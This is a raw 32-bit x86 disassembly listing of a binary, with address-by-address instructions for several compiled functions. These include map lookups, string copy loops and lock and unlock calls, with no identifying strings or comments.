   16612:	cmp    BYTE PTR [edi+0x8],0x0
   16616:	je     0x16633
   16618:	push   DWORD PTR [ebp+0xc]
   1661b:	lea    eax,[ebp+0xc]
   1661e:	push   ebx
   1661f:	push   esi
   16620:	push   eax
   16621:	mov    ecx,edi
   16623:	call   0x15c9e
   16628:	mov    ecx,DWORD PTR [eax]
   1662a:	mov    eax,DWORD PTR [ebp+0x8]
   1662d:	mov    BYTE PTR [eax+0x4],0x1
   16631:	jmp    0x16666
   16633:	mov    DWORD PTR [ebp-0x4],ebx
   16636:	test   al,al
   16638:	je     0x16649
   1663a:	mov    eax,DWORD PTR [edi+0x4]
   1663d:	cmp    ebx,DWORD PTR [eax]
   1663f:	je     0x16618
   16641:	lea    ecx,[ebp-0x4]
   16644:	call   0x133f2
   16649:	push   DWORD PTR [ebp+0xc]
   1664c:	mov    eax,DWORD PTR [ebp-0x4]
   1664f:	add    eax,0xc
   16652:	push   eax
   16653:	call   0x19818
   16658:	test   al,al
   1665a:	jne    0x16618
   1665c:	mov    eax,DWORD PTR [ebp+0x8]
   1665f:	mov    ecx,DWORD PTR [ebp-0x4]
   16662:	mov    BYTE PTR [eax+0x4],0x0
   16666:	pop    edi
   16667:	pop    esi
   16668:	mov    DWORD PTR [eax],ecx
   1666a:	pop    ebx
   1666b:	leave  
   1666c:	ret    0x8
   1666f:	int3   
   16670:	int3   
   16671:	int3   
   16672:	int3   
   16673:	int3   
   16674:	mov    edi,edi
   16676:	push   ebp
   16677:	mov    ebp,esp
   16679:	sub    esp,0x10
   1667c:	push   DWORD PTR [ebp+0x8]
   1667f:	lea    ecx,[ebp-0x10]
   16682:	call   0x15e16
   16687:	push   DWORD PTR [ebp+0xc]
   1668a:	mov    ecx,DWORD PTR [ebp+0x8]
   1668d:	call   0x15e42
   16692:	mov    ecx,DWORD PTR [ebp+0xc]
   16695:	lea    eax,[ebp-0x10]
   16698:	push   eax
   16699:	call   0x15e42
   1669e:	lea    ecx,[ebp-0x10]
   166a1:	call   0x160fe
   166a6:	leave  
   166a7:	ret    0x8
   166aa:	int3   
   166ab:	int3   
   166ac:	int3   
   166ad:	int3   
   166ae:	int3   
   166af:	int3   
   166b0:	mov    edi,edi
   166b2:	push   ebp
   166b3:	mov    ebp,esp
   166b5:	push   esi
   166b6:	push   edi
   166b7:	xor    edi,edi
   166b9:	push   edi
   166ba:	push   edi
   166bb:	push   edi
   166bc:	mov    esi,ecx
   166be:	mov    eax,DWORD PTR [esi+0x10]
   166c1:	push   edi
   166c2:	push   eax
   166c3:	call   DWORD PTR ds:0x1ee28
   166c9:	test   eax,eax
   166cb:	jl     0x166e2
   166cd:	lea    eax,[ebp+0x8]
   166d0:	push   eax
   166d1:	mov    ecx,esi
   166d3:	call   0x14c88
   166d8:	push   edi
   166d9:	push   DWORD PTR [esi+0x10]
   166dc:	call   DWORD PTR ds:0x1ee24
   166e2:	pop    edi
   166e3:	pop    esi
   166e4:	pop    ebp
   166e5:	ret    0x4
   166e8:	int3   
   166e9:	int3   
   166ea:	int3   
   166eb:	int3   
   166ec:	int3   
   166ed:	int3   
   166ee:	mov    edi,edi
   166f0:	push   ebp
   166f1:	mov    ebp,esp
   166f3:	sub    esp,0x50
   166f6:	test   BYTE PTR [ebp+0x8],0x20
   166fa:	je     0x167a9
   16700:	push   ebx
   16701:	lea    ecx,[ebp-0x50]
   16704:	call   0x136d8
   16709:	mov    ecx,DWORD PTR ds:0x7ed00
   1670f:	lea    eax,[ebp-0x50]
   16712:	push   eax
   16713:	push   DWORD PTR [ebp+0xc]
   16716:	call   0x16096
   1671b:	test   al,al
   1671d:	je     0x167a5
   16723:	mov    ecx,DWORD PTR [ebp+0x10]
   16726:	lea    eax,[ebp-0x48]
   16729:	push   eax
   1672a:	call   0x129ea
   1672f:	mov    eax,DWORD PTR [ebp+0x14]
   16732:	mov    ecx,DWORD PTR [ebp-0x40]
   16735:	mov    DWORD PTR [eax],ecx
   16737:	mov    ecx,DWORD PTR [ebp+0x18]
   1673a:	lea    eax,[ebp-0x3c]
   1673d:	push   eax
   1673e:	call   0x129ea
   16743:	mov    ecx,DWORD PTR [ebp+0x1c]
   16746:	lea    eax,[ebp-0x34]
   16749:	push   eax
   1674a:	call   0x129ea
   1674f:	mov    ecx,DWORD PTR [ebp+0x20]
   16752:	lea    eax,[ebp-0x2c]
   16755:	push   eax
   16756:	call   0x129ea
   1675b:	mov    eax,DWORD PTR [ebp+0x28]
   1675e:	mov    ecx,DWORD PTR [ebp-0x24]
   16761:	mov    DWORD PTR [eax],ecx
   16763:	mov    ecx,DWORD PTR [ebp+0x24]
   16766:	lea    eax,[ebp-0x8]
   16769:	push   eax
   1676a:	call   0x129ea
   1676f:	mov    eax,DWORD PTR [ebp+0x30]
   16772:	mov    ecx,DWORD PTR [ebp-0x18]
   16775:	mov    DWORD PTR [eax],ecx
   16777:	mov    ecx,DWORD PTR [ebp-0x14]
   1677a:	mov    DWORD PTR [eax+0x4],ecx
   1677d:	mov    eax,DWORD PTR [ebp+0x34]
   16780:	mov    ecx,DWORD PTR [ebp-0x10]
   16783:	mov    DWORD PTR [eax],ecx
   16785:	mov    ecx,DWORD PTR [ebp-0xc]
   16788:	mov    DWORD PTR [eax+0x4],ecx
   1678b:	mov    eax,DWORD PTR [ebp+0x2c]
   1678e:	mov    ecx,DWORD PTR [ebp-0x20]
   16791:	mov    DWORD PTR [eax],ecx
   16793:	mov    bl,0x1
   16795:	lea    ecx,[ebp-0x50]
   16798:	call   0x11eec
   1679d:	mov    al,bl
   1679f:	pop    ebx
   167a0:	jmp    0x16840
   167a5:	xor    bl,bl
   167a7:	jmp    0x16795
   167a9:	mov    ecx,DWORD PTR ds:0x7ecf8
   167af:	push   esi
   167b0:	push   DWORD PTR [ebp+0xc]
   167b3:	lea    eax,[ebp+0xc]
   167b6:	push   eax
   167b7:	call   0x13c3c
   167bc:	mov    esi,DWORD PTR [ebp+0xc]
   167bf:	mov    eax,ds:0x7ecf8
   167c4:	cmp    esi,DWORD PTR [eax+0x4]
   167c7:	jne    0x167cd
   167c9:	xor    al,al
   167cb:	jmp    0x1683f
   167cd:	mov    ecx,DWORD PTR [ebp+0x10]
   167d0:	lea    eax,[esi+0x20]
   167d3:	push   eax
   167d4:	call   0x129ea
   167d9:	mov    eax,DWORD PTR [esi+0x28]
   167dc:	mov    ecx,DWORD PTR [ebp+0x14]
   167df:	mov    DWORD PTR [ecx],eax
   167e1:	mov    ecx,DWORD PTR [ebp+0x18]
   167e4:	lea    eax,[esi+0x2c]
   167e7:	push   eax
   167e8:	call   0x129ea
   167ed:	mov    ecx,DWORD PTR [ebp+0x1c]
   167f0:	lea    eax,[esi+0x34]
   167f3:	push   eax
   167f4:	call   0x129ea
   167f9:	mov    ecx,DWORD PTR [ebp+0x20]
   167fc:	lea    eax,[esi+0x3c]
   167ff:	push   eax
   16800:	call   0x129ea
   16805:	mov    ecx,DWORD PTR [ebp+0x24]
   16808:	lea    eax,[esi+0x60]
   1680b:	push   eax
   1680c:	call   0x129ea
   16811:	mov    eax,DWORD PTR [esi+0x44]
   16814:	mov    ecx,DWORD PTR [ebp+0x28]
   16817:	mov    DWORD PTR [ecx],eax
   16819:	mov    ecx,DWORD PTR [esi+0x50]
   1681c:	mov    eax,DWORD PTR [ebp+0x30]
   1681f:	mov    DWORD PTR [eax],ecx
   16821:	mov    ecx,DWORD PTR [esi+0x54]
   16824:	mov    DWORD PTR [eax+0x4],ecx
   16827:	mov    ecx,DWORD PTR [esi+0x58]
   1682a:	mov    eax,DWORD PTR [ebp+0x34]
   1682d:	mov    DWORD PTR [eax],ecx
   1682f:	mov    ecx,DWORD PTR [esi+0x5c]
   16832:	mov    DWORD PTR [eax+0x4],ecx
   16835:	mov    eax,DWORD PTR [esi+0x48]
   16838:	mov    ecx,DWORD PTR [ebp+0x2c]
   1683b:	mov    DWORD PTR [ecx],eax
   1683d:	mov    al,0x1
   1683f:	pop    esi
   16840:	leave  
   16841:	ret    0x30
   16844:	int3   
   16845:	int3   
   16846:	int3   
   16847:	int3   
   16848:	int3   
   16849:	int3   
   1684a:	push   0x54
   1684c:	push   0x7dff8
   16851:	call   0x1dadc
   16856:	xor    esi,esi
   16858:	push   esi
   16859:	push   esi
   1685a:	push   esi
   1685b:	push   esi
   1685c:	push   0x7eb70
   16861:	call   DWORD PTR ds:0x1ee28
   16867:	cmp    eax,esi
   16869:	jl     0x16a2a
   1686f:	mov    DWORD PTR [ebp-0x4],esi
   16872:	or     edi,0xffffffff
   16875:	push   edi
   16876:	mov    esi,0x1def0
   1687b:	push   esi
   1687c:	lea    ecx,[ebp-0x54]
   1687f:	call   0x110cc
   16884:	push   edi
   16885:	push   esi
   16886:	lea    ecx,[ebp-0x4c]
   16889:	call   0x110cc
   1688e:	push   edi
   1688f:	push   esi
   16890:	lea    ecx,[ebp-0x44]
   16893:	call   0x110cc
   16898:	push   edi
   16899:	push   esi
   1689a:	lea    ecx,[ebp-0x3c]
   1689d:	call   0x110cc
   168a2:	push   edi
   168a3:	push   esi
   168a4:	lea    ecx,[ebp-0x34]
   168a7:	call   0x110cc
   168ac:	lea    eax,[ebp-0x64]
   168af:	push   eax
   168b0:	lea    eax,[ebp-0x5c]
   168b3:	push   eax
   168b4:	lea    eax,[ebp-0x20]
   168b7:	push   eax
   168b8:	lea    eax,[ebp-0x1c]
   168bb:	push   eax
   168bc:	lea    eax,[ebp-0x34]
   168bf:	push   eax
   168c0:	lea    eax,[ebp-0x3c]
   168c3:	push   eax
   168c4:	lea    eax,[ebp-0x44]
   168c7:	push   eax
   168c8:	lea    eax,[ebp-0x54]
   168cb:	push   eax
   168cc:	lea    eax,[ebp-0x24]
   168cf:	push   eax
   168d0:	lea    eax,[ebp-0x4c]
   168d3:	push   eax
   168d4:	mov    edi,DWORD PTR [ebp+0x8]
   168d7:	push   edi
   168d8:	mov    esi,DWORD PTR [ebp+0xc]
   168db:	push   DWORD PTR [esi+0x4]
   168de:	call   0x166ee
   168e3:	test   al,al
   168e5:	jne    0x168f3
   168e7:	mov    DWORD PTR [esi+0x8],0x1
   168ee:	jmp    0x169d8
   168f3:	mov    edx,DWORD PTR [edi+0x4]
   168f6:	mov    eax,DWORD PTR [ebp-0x48]
   168f9:	lea    ecx,[eax+edx*1+0x2]
   168fd:	mov    eax,DWORD PTR [ebp-0x50]
   16900:	lea    edi,[eax+ecx*1+0x5]
   16904:	mov    eax,DWORD PTR [ebp-0x40]
   16907:	lea    eax,[eax+edi*1+0x1]
   1690b:	mov    DWORD PTR [ebp-0x28],eax
   1690e:	mov    ebx,DWORD PTR [ebp-0x38]
   16911:	lea    eax,[ebx+eax*1+0x1]
   16915:	mov    DWORD PTR [ebp-0x2c],eax
   16918:	mov    ebx,DWORD PTR [ebp-0x30]
   1691b:	lea    eax,[ebx+eax*1+0x1]
   1691f:	cmp    eax,DWORD PTR [esi]
   16921:	jbe    0x16931
   16923:	mov    DWORD PTR [esi],eax
   16925:	mov    DWORD PTR [esi+0x8],0x2
   1692c:	jmp    0x169d8
   16931:	and    DWORD PTR [esi+0x8],0x0
   16935:	mov    eax,DWORD PTR [ebp-0x1c]
   16938:	mov    DWORD PTR [esi+0xc],eax
   1693b:	mov    eax,DWORD PTR [ebp-0x5c]
   1693e:	mov    DWORD PTR [esi+0x18],eax
   16941:	mov    eax,DWORD PTR [ebp-0x58]
   16944:	mov    DWORD PTR [esi+0x1c],eax
   16947:	mov    eax,DWORD PTR [ebp-0x64]
   1694a:	mov    DWORD PTR [esi+0x20],eax
   1694d:	mov    eax,DWORD PTR [ebp-0x60]
   16950:	mov    DWORD PTR [esi+0x24],eax
   16953:	mov    eax,DWORD PTR [ebp-0x20]
   16956:	mov    DWORD PTR [esi+0x10],eax
   16959:	mov    eax,DWORD PTR [ebp+0x8]
   1695c:	mov    eax,DWORD PTR [eax]
   1695e:	mov    DWORD PTR [ebp-0x1c],eax
   16961:	lea    eax,[esi+0x28]
   16964:	mov    ebx,DWORD PTR [ebp-0x1c]
   16967:	mov    bl,BYTE PTR [ebx]
   16969:	mov    BYTE PTR [ebp+0xb],bl
   1696c:	mov    BYTE PTR [eax],bl
   1696e:	inc    DWORD PTR [ebp-0x1c]
   16971:	inc    eax
   16972:	test   bl,bl
   16974:	jne    0x16964
   16976:	mov    ebx,DWORD PTR [ebp-0x4c]
   16979:	lea    edx,[edx+esi*1+0x29]
   1697d:	mov    al,BYTE PTR [ebx]
   1697f:	mov    BYTE PTR [edx],al
   16981:	inc    ebx
   16982:	inc    edx
   16983:	test   al,al
   16985:	jne    0x1697d
   16987:	mov    eax,DWORD PTR [ebp-0x24]
   1698a:	mov    DWORD PTR [ecx+esi*1+0x28],eax
   1698e:	mov    edx,DWORD PTR [ebp-0x54]
   16991:	lea    ecx,[ecx+esi*1+0x2c]
   16995:	mov    al,BYTE PTR [edx]
   16997:	mov    BYTE PTR [ecx],al
   16999:	inc    edx
   1699a:	inc    ecx
   1699b:	test   al,al
   1699d:	jne    0x16995
   1699f:	mov    ecx,DWORD PTR [ebp-0x44]
   169a2:	lea    edi,[edi+esi*1+0x28]
   169a6:	mov    al,BYTE PTR [ecx]
   169a8:	mov    BYTE PTR [edi],al
   169aa:	inc    ecx
   169ab:	inc    edi
   169ac:	test   al,al
   169ae:	jne    0x169a6
   169b0:	mov    edx,DWORD PTR [ebp-0x3c]
   169b3:	mov    eax,DWORD PTR [ebp-0x28]
   169b6:	lea    eax,[eax+esi*1+0x28]
   169ba:	mov    cl,BYTE PTR [edx]
   169bc:	mov    BYTE PTR [eax],cl
   169be:	inc    edx
   169bf:	inc    eax
   169c0:	test   cl,cl
   169c2:	jne    0x169ba
   169c4:	mov    ecx,DWORD PTR [ebp-0x34]
   169c7:	mov    eax,DWORD PTR [ebp-0x2c]
   169ca:	lea    esi,[eax+esi*1+0x28]
   169ce:	mov    al,BYTE PTR [ecx]
   169d0:	mov    BYTE PTR [esi],al
   169d2:	inc    ecx
   169d3:	inc    esi
   169d4:	test   al,al
   169d6:	jne    0x169ce
   169d8:	push   DWORD PTR [ebp-0x34]
   169db:	call   0x10a9a
   169e0:	push   DWORD PTR [ebp-0x3c]
   169e3:	call   0x10a9a
   169e8:	push   DWORD PTR [ebp-0x44]
   169eb:	call   0x10a9a
   169f0:	push   DWORD PTR [ebp-0x4c]
   169f3:	call   0x10a9a
   169f8:	push   DWORD PTR [ebp-0x54]
   169fb:	call   0x10a9a
   16a00:	add    esp,0x14
   16a03:	jmp    0x16a16
   16a05:	xor    eax,eax
   16a07:	inc    eax
   16a08:	ret    
   16a09:	mov    esp,DWORD PTR [ebp-0x18]
   16a0c:	mov    eax,DWORD PTR [ebp+0xc]
   16a0f:	mov    DWORD PTR [eax+0x8],0x4
   16a16:	mov    DWORD PTR [ebp-0x4],0xfffffffe
   16a1d:	push   0x0
   16a1f:	push   0x7eb70
   16a24:	call   DWORD PTR ds:0x1ee24
   16a2a:	call   0x1db21
   16a2f:	ret    0x8
   16a32:	int3   
   16a33:	int3   
   16a34:	int3   
   16a35:	int3   
   16a36:	int3   
   16a37:	int3   
   16a38:	mov    edi,edi
   16a3a:	push   ebp
   16a3b:	mov    ebp,esp
   16a3d:	sub    esp,0x10
   16a40:	mov    eax,DWORD PTR [ebp+0x8]
   16a43:	mov    eax,DWORD PTR [eax]
   16a45:	and    DWORD PTR [ebp-0x4],0x0
   16a49:	mov    DWORD PTR [ebp-0x8],eax
   16a4c:	lea    eax,[ebp-0x8]
   16a4f:	push   eax
   16a50:	lea    eax,[ebp-0x10]
   16a53:	push   eax
   16a54:	call   0x16150
   16a59:	mov    eax,DWORD PTR [eax]
   16a5b:	add    eax,0x10
   16a5e:	leave  
   16a5f:	ret    0x4
   16a62:	int3   
   16a63:	int3   
   16a64:	int3   
   16a65:	int3   
   16a66:	int3   
   16a67:	int3   
   16a68:	mov    edi,edi
   16a6a:	push   esi
   16a6b:	mov    esi,ecx
   16a6d:	mov    BYTE PTR [esi+0x8],0x0
   16a71:	call   0x14128
   16a76:	mov    eax,esi
   16a78:	pop    esi
   16a79:	ret    0x8
   16a7c:	int3   
   16a7d:	int3   
   16a7e:	int3   
   16a7f:	int3   
   16a80:	int3   
   16a81:	int3   
   16a82:	mov    edi,edi
   16a84:	push   ebp
   16a85:	mov    ebp,esp
   16a87:	push   ecx
   16a88:	push   ecx
   16a89:	push   DWORD PTR [ebp+0xc]
   16a8c:	lea    eax,[ebp-0x8]
   16a8f:	push   eax
   16a90:	call   0x161fa
   16a95:	mov    eax,DWORD PTR [ebp+0x8]
   16a98:	mov    ecx,DWORD PTR [ebp-0x8]
   16a9b:	mov    DWORD PTR [eax],ecx
   16a9d:	mov    cl,BYTE PTR [ebp-0x4]
   16aa0:	mov    BYTE PTR [eax+0x4],cl
   16aa3:	leave  
   16aa4:	ret    0x8
   16aa7:	int3   
   16aa8:	int3   
   16aa9:	int3   
   16aaa:	int3   
   16aab:	int3   
   16aac:	mov    edi,edi
   16aae:	push   ebp
   16aaf:	mov    ebp,esp
   16ab1:	push   ecx
   16ab2:	push   esi
   16ab3:	mov    esi,ecx
   16ab5:	mov    eax,DWORD PTR [esi+0x4]
   16ab8:	mov    ecx,DWORD PTR [eax]
   16aba:	push   eax
   16abb:	push   ecx
   16abc:	lea    eax,[ebp-0x4]
   16abf:	push   eax
   16ac0:	mov    ecx,esi
   16ac2:	call   0x16294
   16ac7:	push   DWORD PTR [esi+0x4]
   16aca:	call   0x10a9a
   16acf:	xor    eax,eax
   16ad1:	mov    DWORD PTR [esi+0x4],eax
   16ad4:	mov    DWORD PTR [esi+0xc],eax
   16ad7:	dec    DWORD PTR ds:0x7f834
   16add:	pop    ecx
   16ade:	pop    esi
   16adf:	jne    0x16af7
   16ae1:	mov    ecx,DWORD PTR ds:0x7f6d0
   16ae7:	mov    ds:0x7f6d0,eax
   16aec:	cmp    ecx,eax
   16aee:	je     0x16af7
   16af0:	push   ecx
   16af1:	call   0x10a9a
   16af6:	pop    ecx
   16af7:	leave  
   16af8:	ret    
   16af9:	int3   
   16afa:	int3   
   16afb:	int3   
   16afc:	int3   
   16afd:	int3   
   16afe:	mov    edi,edi
   16b00:	push   ebp
   16b01:	mov    ebp,esp
   16b03:	push   ecx
   16b04:	push   ecx
   16b05:	push   DWORD PTR [ebp+0xc]
   16b08:	lea    eax,[ebp-0x8]
   16b0b:	push   eax
   16b0c:	call   0x16312
   16b11:	mov    eax,DWORD PTR [ebp+0x8]
   16b14:	mov    ecx,DWORD PTR [ebp-0x8]
   16b17:	mov    DWORD PTR [eax],ecx
   16b19:	mov    cl,BYTE PTR [ebp-0x4]
   16b1c:	mov    BYTE PTR [eax+0x4],cl
   16b1f:	leave  
   16b20:	ret    0x8
   16b23:	int3   
   16b24:	int3   
   16b25:	int3   
   16b26:	int3   
   16b27:	int3   
   16b28:	mov    edi,edi
   16b2a:	push   ebp
   16b2b:	mov    ebp,esp
   16b2d:	push   ecx
   16b2e:	mov    eax,DWORD PTR [ecx+0x4]
   16b31:	mov    edx,DWORD PTR [eax]
   16b33:	push   eax
   16b34:	push   edx
   16b35:	lea    eax,[ebp-0x4]
   16b38:	push   eax
   16b39:	call   0x163ac
   16b3e:	leave  
   16b3f:	ret    
   16b40:	int3   
   16b41:	int3   
   16b42:	int3   
   16b43:	int3   
   16b44:	int3   
   16b45:	int3   
   16b46:	mov    edi,edi
   16b48:	push   ebp
   16b49:	mov    ebp,esp
   16b4b:	push   ecx
   16b4c:	push   ecx
   16b4d:	push   DWORD PTR [ebp+0xc]
   16b50:	lea    eax,[ebp-0x8]
   16b53:	push   eax
   16b54:	call   0x1642a
   16b59:	mov    eax,DWORD PTR [ebp+0x8]
   16b5c:	mov    ecx,DWORD PTR [ebp-0x8]
   16b5f:	mov    DWORD PTR [eax],ecx
   16b61:	mov    cl,BYTE PTR [ebp-0x4]
   16b64:	mov    BYTE PTR [eax+0x4],cl
   16b67:	leave  
   16b68:	ret    0x8
   16b6b:	int3   
   16b6c:	int3   
   16b6d:	int3   
   16b6e:	int3   
   16b6f:	int3   
   16b70:	mov    edi,edi
   16b72:	push   ebp
   16b73:	mov    ebp,esp
   16b75:	push   ecx
   16b76:	push   ecx
   16b77:	push   DWORD PTR [ebp+0xc]
   16b7a:	lea    eax,[ebp-0x8]
   16b7d:	push   eax
   16b7e:	call   0x164c4
   16b83:	mov    eax,DWORD PTR [ebp+0x8]
   16b86:	mov    ecx,DWORD PTR [ebp-0x8]
   16b89:	mov    DWORD PTR [eax],ecx
   16b8b:	mov    cl,BYTE PTR [ebp-0x4]
   16b8e:	mov    BYTE PTR [eax+0x4],cl
   16b91:	leave  
   16b92:	ret    0x8
   16b95:	int3   
   16b96:	int3   
   16b97:	int3   
   16b98:	int3   
   16b99:	int3   
   16b9a:	mov    edi,edi
   16b9c:	push   ebp
   16b9d:	mov    ebp,esp
   16b9f:	push   ecx
   16ba0:	push   ecx
   16ba1:	push   esi
   16ba2:	push   DWORD PTR [ebp+0x8]
   16ba5:	lea    eax,[ebp-0x8]
   16ba8:	push   eax
   16ba9:	mov    esi,ecx
   16bab:	call   0x1418a
   16bb0:	and    DWORD PTR [ebp+0x8],0x0
   16bb4:	lea    eax,[ebp+0x8]
   16bb7:	push   eax
   16bb8:	push   DWORD PTR [ebp-0x4]
   16bbb:	push   DWORD PTR [ebp-0x8]
   16bbe:	call   0x13a80
   16bc3:	add    esp,0xc
   16bc6:	push   DWORD PTR [ebp-0x4]
   16bc9:	lea    eax,[ebp-0x4]
   16bcc:	push   DWORD PTR [ebp-0x8]
   16bcf:	mov    ecx,esi
   16bd1:	push   eax
   16bd2:	call   0x1655c
   16bd7:	mov    eax,DWORD PTR [ebp+0x8]
   16bda:	pop    esi
   16bdb:	leave  
   16bdc:	ret    0x4
   16bdf:	int3   
   16be0:	int3   
   16be1:	int3   
   16be2:	int3   
   16be3:	int3   
   16be4:	mov    edi,edi
   16be6:	push   ebp
   16be7:	mov    ebp,esp
   16be9:	push   ecx
   16bea:	mov    eax,DWORD PTR [ecx+0x4]
   16bed:	mov    edx,DWORD PTR [eax]
   16bef:	push   eax
   16bf0:	push   edx
   16bf1:	lea    eax,[ebp-0x4]
   16bf4:	push   eax
   16bf5:	call   0x1655c
   16bfa:	leave  
   16bfb:	ret    
   16bfc:	int3   
   16bfd:	int3   
   16bfe:	int3   
   16bff:	int3   
   16c00:	int3   
   16c01:	int3   
   16c02:	mov    edi,edi
   16c04:	push   ebp
   16c05:	mov    ebp,esp
   16c07:	push   ecx
   16c08:	push   ecx
   16c09:	push   DWORD PTR [ebp+0xc]
   16c0c:	lea    eax,[ebp-0x8]
   16c0f:	push   eax
   16c10:	call   0x165da
   16c15:	mov    eax,DWORD PTR [ebp+0x8]
   16c18:	mov    ecx,DWORD PTR [ebp-0x8]
   16c1b:	mov    DWORD PTR [eax],ecx
   16c1d:	mov    cl,BYTE PTR [ebp-0x4]
   16c20:	mov    BYTE PTR [eax+0x4],cl
   16c23:	leave  
   16c24:	ret    0x8
   16c27:	int3   
   16c28:	int3   
   16c29:	int3   
   16c2a:	int3   
   16c2b:	int3   
   16c2c:	mov    edi,edi
   16c2e:	push   esi
   16c2f:	mov    esi,ecx
   16c31:	push   edi
   16c32:	mov    BYTE PTR [esi+0x8],0x0
   16c36:	call   0x14000
   16c3b:	lea    edi,[esi+0x10]
   16c3e:	mov    ecx,edi
   16c40:	call   0x12a34
   16c45:	mov    edi,DWORD PTR [edi]
   16c47:	push   0x0
   16c49:	push   edi
   16c4a:	call   0x11c50
   16c4f:	call   eax
   16c51:	pop    edi
   16c52:	mov    eax,esi
   16c54:	pop    esi
   16c55:	ret    
   16c56:	int3   
   16c57:	int3   
   16c58:	int3   
   16c59:	int3   
   16c5a:	int3   
   16c5b:	int3   
   16c5c:	mov    edi,edi
   16c5e:	push   ebp
   16c5f:	mov    ebp,esp
   16c61:	push   esi
   16c62:	push   edi
   16c63:	xor    edi,edi
   16c65:	push   edi
   16c66:	push   edi
   16c67:	push   edi
   16c68:	mov    esi,ecx
   16c6a:	mov    eax,DWORD PTR [esi+0x10]
   16c6d:	push   edi
   16c6e:	push   eax
   16c6f:	call   DWORD PTR ds:0x1ee28
   16c75:	test   eax,eax
   16c77:	jl     0x16c93
   16c79:	lea    eax,[ebp+0x8]
   16c7c:	push   eax
   16c7d:	mov    ecx,esi
   16c7f:	call   0x16a38
   16c84:	mov    ecx,DWORD PTR [ebp+0xc]
   16c87:	push   edi
   16c88:	mov    DWORD PTR [eax],ecx
   16c8a:	push   DWORD PTR [esi+0x10]
   16c8d:	call   DWORD PTR ds:0x1ee24
   16c93:	pop    edi
   16c94:	pop    esi
   16c95:	pop    ebp
   16c96:	ret    0x8
   16c99:	int3   
   16c9a:	int3   
   16c9b:	int3   
   16c9c:	int3   
   16c9d:	int3   
   16c9e:	mov    edi,edi
   16ca0:	push   ebp
   16ca1:	mov    ebp,esp
   16ca3:	sub    esp,0x38
   16ca6:	push   esi
   16ca7:	call   0x1a1fc
   16cac:	test   al,al
   16cae:	jne    0x16cb8
   16cb0:	mov    eax,DWORD PTR [ebp+0x8]
   16cb3:	jmp    0x16d89
   16cb8:	push   DWORD PTR [ebp+0xc]
   16cbb:	lea    ecx,[ebp-0x8]
   16cbe:	push   DWORD PTR [ebp+0x8]
   16cc1:	call   0x12b1a
   16cc6:	mov    ecx,DWORD PTR ds:0x7f860
   16ccc:	lea    eax,[ebp-0x8]
   16ccf:	push   eax
   16cd0:	lea    eax,[ebp+0xc]
   16cd3:	push   eax
   16cd4:	call   0x1421e
   16cd9:	mov    esi,DWORD PTR [ebp+0xc]
   16cdc:	mov    eax,ds:0x7f860
   16ce1:	cmp    esi,DWORD PTR [eax+0x4]
   16ce4:	jne    0x16d44
   16ce6:	push   ecx
   16ce7:	push   ecx
   16ce8:	lea    eax,[ebp-0x8]
   16ceb:	mov    ecx,esp
   16ced:	push   eax
   16cee:	call   0x12b3a
   16cf3:	lea    eax,[ebp-0x10]
   16cf6:	push   eax
   16cf7:	call   0x12bb8
   16cfc:	lea    eax,[ebp-0x10]
   16cff:	push   eax
   16d00:	lea    eax,[ebp-0x8]
   16d03:	push   eax
   16d04:	lea    ecx,[ebp-0x38]
   16d07:	call   0x13608
   16d0c:	lea    eax,[ebp-0x38]
   16d0f:	push   eax
   16d10:	lea    ecx,[ebp-0x28]
   16d13:	call   0x134a2
   16d18:	mov    ecx,DWORD PTR ds:0x7f860
   16d1e:	lea    eax,[ebp-0x28]
   16d21:	push   eax
   16d22:	lea    eax,[ebp-0x18]
   16d25:	push   eax
   16d26:	call   0x16c02
   16d2b:	lea    ecx,[ebp-0x28]
   16d2e:	call   0x110ae
   16d33:	lea    ecx,[ebp-0x38]
   16d36:	call   0x110ae
   16d3b:	push   DWORD PTR [ebp-0x10]
   16d3e:	call   0x10a9a
   16d43:	pop    ecx
   16d44:	mov    eax,DWORD PTR [ebp+0x10]
   16d47:	movzx  eax,BYTE PTR [eax]
   16d4a:	cmp    eax,0x100
   16d4f:	jge    0x16d67
   16d51:	mov    ecx,DWORD PTR ds:0x7f860
   16d57:	lea    eax,[ebp-0x8]
   16d5a:	push   eax
   16d5b:	lea    eax,[ebp+0xc]
   16d5e:	push   eax
   16d5f:	call   0x1421e
   16d64:	mov    esi,DWORD PTR [ebp+0xc]
   16d67:	mov    eax,ds:0x7f860
   16d6c:	cmp    esi,DWORD PTR [eax+0x4]
   16d6f:	je     0x16d76
   16d71:	mov    esi,DWORD PTR [esi+0x14]
   16d74:	jmp    0x16d79
   16d76:	mov    esi,DWORD PTR [ebp+0x8]
   16d79:	call   0x1a218
   16d7e:	push   DWORD PTR [ebp-0x8]
   16d81:	call   0x10a9a
   16d86:	pop    ecx
   16d87:	mov    eax,esi
   16d89:	pop    esi
   16d8a:	leave  
   16d8b:	ret    0xc
   16d8e:	int3   
   16d8f:	int3   
   16d90:	int3   
   16d91:	int3   
   16d92:	int3   
   16d93:	int3   
   16d94:	mov    edi,edi
   16d96:	push   ebp
   16d97:	mov    ebp,esp
   16d99:	sub    esp,0x38
   16d9c:	push   esi
   16d9d:	call   0x1a1fc
   16da2:	test   al,al
   16da4:	jne    0x16dae
   16da6:	mov    eax,DWORD PTR [ebp+0x8]
   16da9:	jmp    0x16e7f
   16dae:	push   DWORD PTR [ebp+0xc]
   16db1:	lea    ecx,[ebp-0x8]
   16db4:	push   DWORD PTR [ebp+0x8]
   16db7:	call   0x129a8
   16dbc:	mov    ecx,DWORD PTR ds:0x7f864
   16dc2:	lea    eax,[ebp-0x8]
   16dc5:	push   eax
   16dc6:	lea    eax,[ebp+0xc]
   16dc9:	push   eax
   16dca:	call   0x13c84
   16dcf:	mov    esi,DWORD PTR [ebp+0xc]
   16dd2:	mov    eax,ds:0x7f864
   16dd7:	cmp    esi,DWORD PTR [eax+0x4]
   16dda:	jne    0x16e3a
   16ddc:	push   ecx
   16ddd:	push   ecx
   16dde:	lea    eax,[ebp-0x8]
   16de1:	mov    ecx,esp
   16de3:	push   eax
   16de4:	call   0x129c8
   16de9:	lea    eax,[ebp-0x10]
   16dec:	push   eax
   16ded:	call   0x12bfc
   16df2:	lea    eax,[ebp-0x10]
   16df5:	push   eax
   16df6:	lea    eax,[ebp-0x8]
   16df9:	push   eax
   16dfa:	lea    ecx,[ebp-0x38]
   16dfd:	call   0x12c3c
   16e02:	lea    eax,[ebp-0x38]
   16e05:	push   eax
   16e06:	lea    ecx,[ebp-0x28]
   16e09:	call   0x134ce
   16e0e:	mov    ecx,DWORD PTR ds:0x7f864
   16e14:	lea    eax,[ebp-0x28]
   16e17:	push   eax
   16e18:	lea    eax,[ebp-0x18]
   16e1b:	push   eax
   16e1c:	call   0x16b46
